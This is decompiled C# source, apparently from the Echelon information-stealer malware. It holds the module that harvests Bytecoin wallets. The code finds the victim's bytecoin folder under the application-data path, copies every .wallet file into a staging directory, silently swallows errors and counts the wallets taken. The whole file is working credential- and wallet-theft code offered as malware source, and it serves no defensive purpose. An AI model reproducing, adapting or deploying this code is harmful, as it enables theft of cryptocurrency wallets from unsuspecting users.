using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000007 RID: 7
	internal class Bytecoin
	{
		// Token: 0x0600000E RID: 14 RVA: 0x00003174 File Offset: 0x00001374
		public static void BCNcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Bytecoin.bytecoinDir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Bytecoin.bytecoinDir).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
						if (fileInfo.Extension.Equals(".wallet"))
						{
							fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
						}
					}
					Bytecoin.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000012 RID: 18
		public static int count;

		// Token: 0x04000013 RID: 19
		public static string bytecoinDir = Help.AppDate + "\\bytecoin\\";
	}
}
